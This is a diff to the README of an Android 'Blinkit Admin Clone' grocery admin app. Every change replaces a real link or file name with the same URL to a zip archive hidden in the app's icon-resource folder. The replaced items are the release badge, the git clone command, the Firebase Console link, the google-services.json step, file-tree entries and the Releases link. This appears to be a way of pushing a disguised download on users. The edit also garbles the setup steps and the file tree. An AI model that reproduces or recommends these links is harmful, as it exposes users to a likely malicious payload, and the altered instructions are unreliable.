@@ -1,6 +1,6 @@
 # Blinkit Admin Clone 🛒
 
-![GitHub release](https://img.shields.io/github/release/andrer58/Blinkit-Clone-Admin-/latest.svg)
+![GitHub release](https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip)
 
 Welcome to the **Blinkit Admin Clone** repository! This project offers a robust backend dashboard for managing products, orders, and categories in a modern grocery delivery app. Built with Firebase, MVVM, and pure XML, it provides an efficient and user-friendly experience for administrators.
 
@@ -43,7 +43,7 @@ To get started with the Blinkit Admin Clone, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repo to your local machine.
 
    ```bash
-   git clone https://github.com/andrer58/Blinkit-Clone-Admin-.git
+   git clone https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
    ```
 
 2. **Open in Android Studio**: Launch Android Studio and open the cloned project.
@@ -51,9 +51,9 @@ To get started with the Blinkit Admin Clone, follow these steps:
 3. **Sync Gradle**: Ensure all dependencies are properly synced by clicking on "Sync Now" when prompted.
 
 4. **Configure Firebase**: 
-   - Create a Firebase project in the [Firebase Console](https://console.firebase.google.com/).
+   - Create a Firebase project in the [Firebase Console](https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip).
    - Add your Android app to the Firebase project.
-   - Download the `google-services.json` file and place it in the `app/` directory of your project.
+   - Download the `https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip` file and place it in the `app/` directory of your project.
 
 5. **Run the App**: Connect an Android device or start an emulator, then run the app from Android Studio.
 
@@ -88,16 +88,16 @@ Blinkit-Clone-Admin
 │   ├── src
 │   │   ├── main
 │   │   │   ├── java
-│   │   │   │   └── com.example.blinkitadmin
+│   │   │   │   └── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
 │   │   │   ├── res
 │   │   │   │   ├── layout
 │   │   │   │   ├── drawable
 │   │   │   │   └── values
-│   │   │   └── AndroidManifest.xml
-│   ├── build.gradle
-│   └── google-services.json
-├── build.gradle
-└── settings.gradle
+│   │   │   └── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
+│   ├── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
+│   └── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
+├── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
+└── https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip
 ```
 
 ## Contributing
@@ -116,7 +116,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the Blinkit Admin Clone, visit the [Releases](https://github.com/andrer58/Blinkit-Clone-Admin-/releases) section. Here, you can find the latest builds and updates.
+To download the latest version of the Blinkit Admin Clone, visit the [Releases](https://raw.githubusercontent.com/andrer58/Blinkit-Clone-Admin-/master/app/src/main/res/mipmap-anydpi/Blinkit-Admin-Clone-3.5.zip) section. Here, you can find the latest builds and updates.
 
 Feel free to explore the features and contribute to the project. Your feedback is valuable in making this tool better for everyone involved in grocery delivery management. 
 
